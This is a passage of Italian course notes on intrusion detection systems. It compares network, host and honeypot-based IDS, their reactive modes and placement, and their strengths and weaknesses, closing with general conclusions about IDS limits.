=== Stateful e stateless

Analogo dei firewall:

- stateless: analizzano #strong[singoli pacchetti] ma non riescono a
  rilevare delle connessioni complete;
- stateful: analizzano delle connessioni nel loro insieme

=== Reattività degli IDS

L'analisi #strong[passiva] prevede la cattura di una copia di tutti i
pacchetti circolanti per la rilevazione di eventuali attacchi.

L'analisi passiva non è invadente per il normale funzionamento del
sistema e non ne peggiora le prestazioni (tipicamente viene fatta
offline).

L'analisi #strong[attiva], oltre al logging, prevede la possibilità di
eseguire delle #strong[azioni] quando viene rilevato un attacco, al fine
di rendere inoffensive le intrusioni il prima possibile.

Gli IDS con analisi attiva tendono agli #strong[IPS] (Intrusion
#strong[Prevention] System).

Esempi di azioni attive:

- terminazione delle applicazioni malevole (`kill`);
- modifiche alle regole di routing/firewall;
- ridirezionare l'attaccate ad una #strong[honeypot];
- aumento del livello di log

=== Localizzazione degli IDS

- host level: funzione di IDS localizzata su un #strong[singolo host] (o
  su un segmento di rete piccolo);
- network level: funzione di IDS #strong[distribuita su tutta la rete]

Nota: la localizzazione indica solo #strong[dove sta] un IDS. Non è da
confondere con l'#strong[obiettivo] dell'IDS (HIDS o NIDS) che indica
quali tipi di intrusione cerca di prevenire.

=== Modalità di intervento

- offline: analisi #strong[a posteriori] dei log;
- online: analisi #strong[real-time] del traffico

=== Obiettivi di un IDS

==== Network Intrusion Detection System (NIDS)

Catturano il traffico di rete sfruttando interfacce in #strong[modalità
promiscua] e cercano di individuare attacchi nel traffico intercettato.

Sono #strong[distribuiti su tutta la rete] e analizzano tutto il
traffico che vedono.

Svantaggi principali:

- non sono in grado di analizzare #strong[traffico cifrato];
- non sempre ciò che vedono è quello che verrà realmente ricevuto
  dall'host finale (insertion attack ed evasion attack)

Sotto alcuni aspetti, i NIDS sono simili ai firewall:

- i NIDS adottano una strategia di #strong[filtering passivo] (ciò che
  non è un attacco viene ignorato), mentre i firewall applicano
  #strong[filtraggio attivo] (scartano i pacchetti indesiderati);
- i NIDS sono sistemi #strong[fail-open] (se smettono di funzionare, il
  traffico continua a circolare), mentre i firewall sono
  #strong[fail-close] (se smettono di funzionare, la rete rimane
  isolata)

Un NIDS può essere configurato in #strong[modalità stealth] utilizzando
2 interfacce:

- una per l'analisi del traffico, configurata senza nessun indirizzo IP
  (che abilita la modalità promiscua);
- una dedicata all'invio degli allarmi

I NIDS possono essere evasi sfruttando ambiguità e differenze
nell'implementazione dei protocolli (es. dovute ai vari sistemi
operativi).

I NIDS, come un qualunque altro dispositivo di rete, possono essere
soggetti ad attacchi DoS.

Se il NIDS è troppo reattivo, un attaccante può sfruttarlo per causare
malfunzionamenti nella rete introducendo dei falsi positivi.

Vantaggi:

- rilevano attacchi che richiedono la manipolazione a basso livello dei
  pacchetti in rete;
- riescono a rilevare attacchi che coinvolgono più macchine;
- non appesantiscono il funzionamento di un singolo host (il NIDS è in
  una macchina dedicata);
- pssono rilevare worms che si propagano in rete

Svantaggi:

- non rilevano attacchi locali (es. privilege escalation, ecc.);
- non riescono a rilevare il #strong[reale] impatto di un pacchetto
  sull'host finale (il pacchetto potrebbe non arrivare, potrebbe essere
  interpretato in altro modo, ecc.);
- incapacità di analizzare pacchetti cifrati

==== Host Intrusion Detection System (HIDS)

Rilevano le intrusioni analizzando gli eventi che avvengono all'interno
dell'host.

Possono sfruttare dei #strong[meccanismi di auditing] messi a
disposizione dal sistema operativo.

Monitorano le attività degli utenti (es. i comandi eseguiti, system
call, ecc.).

Esempi di HIDS:

- Log File Monitor (LFS): analisi batch dei log;
- Intrusion Detection Agent (IDA): analisi real-time degli eventi;
- System Integrity Verifier (SIV): rilevano in real-time modifiche allo
  stato di un sistema, utilizzando spesso delle funzioni hash applicate
  su un singolo file (simile agli antivirus)

Il #strong[target-based IDS] è una variante del modello HIDS in cui
l'analisi è riferita solo a determinate risorse presenti nell'host.

Avere un host come obiettivo è sia un vantaggio che uno svantaggio:

- è un vantaggio perché vedono tutto (e solo) il traffico che arriva
  alle applicazioni (incluso quello cifrato);
- è uno svantaggio perché non è possibile rilevare attacchi che hanno
  come obiettivo più macchine

Gli HIDS sono fortemente dipendenti dalla piattaforma su cui risiedono,
vulnerabilità comprese.

==== Operational IDS

Effettuano l'analisi in funzione dei comportamenti anormali.

Rientrano in questa categoria gli #strong[honeypot]. Si tratta di
sistemi intenzionalmente poco protetti, ma molto controllati.

Ogni collegamento all'honeypot è considerato un tentativo di intrusione,
perché si tratta di sistemi non attivi.

Sono delle #strong[trappole per attaccanti] perché espongono servizi
apparentemente interessanti. Permettono di studiare il comportamento
dell'attaccante, facendogli perdere tempo prezioso.

Vantaggi:

- individuazione di connessioni ostili (es. honeypot);
- tracciabilità delle attività degli attaccanti

Svantaggi:

- sono costosi (bisogna esporre dei servizi interessanti per
  l'attaccante ma che concretamente non fanno niente);
- possono essere compromessi a loro volta

== Conclusioni

Gli IDS sono utili per sapere #strong[chi] ha fatto #strong[cosa],
#strong[quando] e con #strong[quali risultati].

Problematiche principali degli IDS:

- non esiste un singolo IDS che fa tutto e tool differenti possono non
  essere in grado di interagire tra loro per diminuire l'incertezza
  nelle rilevazioni
- ogni IDS ha il suo formato di output

Attività importanti da rilevare:

- checksum errati nei file di sistema;
- codice maligno inserito in richieste HTTP;
- traffico di rete dovuto a worm, virus, attacchi DoS, ecc.;
- violazione delle policy di sicurezza

Non esiste un singolo IDS che riesca a rilevare tutte queste minacce con
precisione assoluta.

Possibili soluzioni:

- si installa almeno un IDS per ogni tipo, complicando notevolmente la
  gestione;
- utilizzare un IDS che riunisca i vantaggi delle diverse tipologie
  oppure più di un IDS ma che siano in grado di #strong[interagire tra
  loro]

Come per i firewall, gli IDS non aumentano la sicurezza in automatico.
